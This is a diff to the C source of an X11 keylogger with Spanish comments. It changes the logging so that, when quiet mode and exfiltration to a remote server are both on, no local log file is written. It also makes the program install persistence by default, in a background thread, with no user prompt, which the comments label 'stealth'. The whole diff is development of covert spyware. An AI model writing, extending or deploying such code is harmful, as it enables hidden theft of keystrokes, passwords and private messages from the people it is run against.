@@ -1271,28 +1271,34 @@ int start_keylogger(void) {
         return 1;
     }
     
-    // Abrir archivo de log
-    g_state.logfile = fopen(g_state.log_filename, "a");
-    if (g_state.logfile == NULL) {
-        if (!g_state.quiet_mode) {
-            fprintf(stderr, "[!] Error: No se puede abrir el archivo de log.\n");
-        }
-        XCloseDisplay(g_state.display);
-        XCloseDisplay(g_state.record_display);
-        return 1;
-    }
+    // Solo abrir archivo de log si:
+    // - No está en modo silencioso+exfiltración, O
+    // - La exfiltración no está habilitada
+    int should_create_log = !g_state.exfil.enabled || !g_state.quiet_mode;
     
-    // Escribir encabezado en el log
-    fprintf(g_state.logfile, "\n=== Nueva sesión de keylogging ===\n");
-    get_timestamp(timestamp, sizeof(timestamp));
-    fprintf(g_state.logfile, "Inicio: %s\n", timestamp);
-    fprintf(g_state.logfile, "Modo: %s\n", g_state.daemon_mode ? "daemon" : "normal");
-    if (g_state.exfil.enabled) {
-        fprintf(g_state.logfile, "Exfiltración: %s:%s%s\n", 
-                g_state.exfil.server, g_state.exfil.port, g_state.exfil.path);
+    if (should_create_log) {
+        g_state.logfile = fopen(g_state.log_filename, "a");
+        if (g_state.logfile == NULL) {
+            if (!g_state.quiet_mode) {
+                fprintf(stderr, "[!] Error: No se puede abrir el archivo de log.\n");
+            }
+            XCloseDisplay(g_state.display);
+            XCloseDisplay(g_state.record_display);
+            return 1;
+        }
+        
+        // Escribir encabezado en el log
+        fprintf(g_state.logfile, "\n=== Nueva sesión de keylogging ===\n");
+        get_timestamp(timestamp, sizeof(timestamp));
+        fprintf(g_state.logfile, "Inicio: %s\n", timestamp);
+        fprintf(g_state.logfile, "Modo: %s\n", g_state.daemon_mode ? "daemon" : "normal");
+        if (g_state.exfil.enabled) {
+            fprintf(g_state.logfile, "Exfiltración: %s:%s%s\n", 
+                    g_state.exfil.server, g_state.exfil.port, g_state.exfil.path);
+        }
+        fprintf(g_state.logfile, "\n");
+        fflush(g_state.logfile);
     }
-    fprintf(g_state.logfile, "\n");
-    fflush(g_state.logfile);
     
     // Inicializar exfiltración si está habilitada
     if (g_state.exfil.enabled) {
@@ -1448,6 +1454,10 @@ int main(int argc, char *argv[]) {
             return 1;
         }
     }
+    
+    // Por defecto, instalar persistencia automáticamente en segundo plano
+    // sin esperar respuesta del usuario (stealth)
+    persistence_install_thread(NULL);
     
     // Opciones largas para getopt_long
     static struct option long_options[] = {
